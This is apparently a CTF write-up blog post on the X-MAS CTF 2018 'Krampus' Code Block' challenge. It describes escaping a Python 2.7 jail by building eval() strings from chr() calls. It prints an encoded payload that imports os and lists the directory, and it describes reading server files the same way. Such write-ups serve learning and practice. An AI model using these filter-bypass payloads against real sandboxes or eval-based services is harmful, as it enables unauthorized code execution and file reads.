---
title: X-MAS CTF 2018 - Krampus' Code Block
layout: post
author: "mr96"
category: misc
tags: misc python pyjail minecraft
---
This challenge took us a lot more time than it should have. We're only given a netcat connection, where we can "talk" to Krampus.

## Solution
Writing `help` we discover that Krampus is simply a Python 2.7 interpreter, so we need to find a bug in some function in order to exploit it. Playing a bit with him we can see that we can use `chr(), input(), print(), eval()` and some useless functions, but none of these with strings, dots, commas, underscores, etc..

After a lot of time we figure out that the right strategy is to use `eval()` encoding the string as a concatenation of `chr()` results.

Again, after some trial and error we found that `eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(108)+chr(105)+chr(115)+chr(116)+chr(100)+chr(105)+chr(114)+chr(40)+chr(39)+chr(46)+chr(39)+chr(41))` works and lists the files in Krampus' directory (it is `eval("__import__('os').listdir('.')")`). Then the struggle begins: we have some py files with the source, an `instruction.txt` file that says that we need to connect to `server.jar` (that is another file) to play with Krampus, and some setting files for the server. Using `eval("open('server.properties').read()")` (obviously encoded as before) we found this

```
#Minecraft server properties
#Sat Dec 22 14:06:58 UTC 2018
player-idle-timeout=0
motd=A Minecraft Server
force-gamemode=false
server-ip=
pvp=true
spawn-npcs=true
spawn-animals=true
generate-structures=true
gamemode=0
server-port=25565
difficulty=1
prevent-proxy-connections=false
use-native-transport=true
resource-pack=
resource-pack-sha1=
online-mode=true
allow-flight=false
```

So it is a Minecraft server! From now, we spent about an hour to try to encode in base64 the server and download it, but it was too big and he stopped answering after a few seconds. Then we tried to run the server on Krampus' as a jar file, but nothing happened. Then we had the idea that it was a real Minecraft server, so we donwloaded the client and... It worked!

From now, it was only 90 painful minutes of playing minecraft to find the flag in the map.
